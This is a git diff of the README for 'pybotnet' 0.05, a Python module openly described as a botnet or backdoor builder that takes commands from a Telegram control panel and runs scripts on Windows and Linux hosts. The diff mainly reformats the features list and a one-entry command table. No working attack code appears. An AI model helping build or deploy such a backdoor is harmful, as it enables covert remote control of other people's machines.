@@ -1,18 +1,21 @@
 # pybotnet version 0.05
 
-## A module for building botnets with Python and Telegram control panel
+A module for building botnet or back door with Python and Telegram control panel
+- [x] windows
+- [x] linux
+- [ ] mac
 
-### See the [TODO List](https://github.com/onionj/pybotnet/blob/master/TODOLIST.MD) if you want to help me <3
+### See the [TODO List](https://github.com/onionj/pybotnet/blob/master/TODOLIST.MD) if you want to *help* me <3
 
 ### Features:
-• get command from telegram and execute scripts \
-• send message to telegram admin \
-• get command from telegram
+* get command from telegram and execute scripts 
+* send message to telegram admin 
+* get command from telegram
 
 
 ### Requirements:
 
-• Python 3.6 or higher.
+* Python 3.6 or higher.
 ```
 pip install -r requirements.txt
 ```
@@ -37,8 +40,9 @@ while True:
 
 ### Commmands:
 Send this message to your api bot in telegram, using the admin account.
-```
-    COMMAND                                                 DO THIS
-do_sleep <scconds> <message>                 # print(message); time.sleep(seccond)
 
-```
+COMMAND | DO THIS | Minimum version required |
+--------|---------|-------------------------|
+do_sleep <scconds> <message> | print(message); time.sleep(seccond) | 0.05 |
+
+
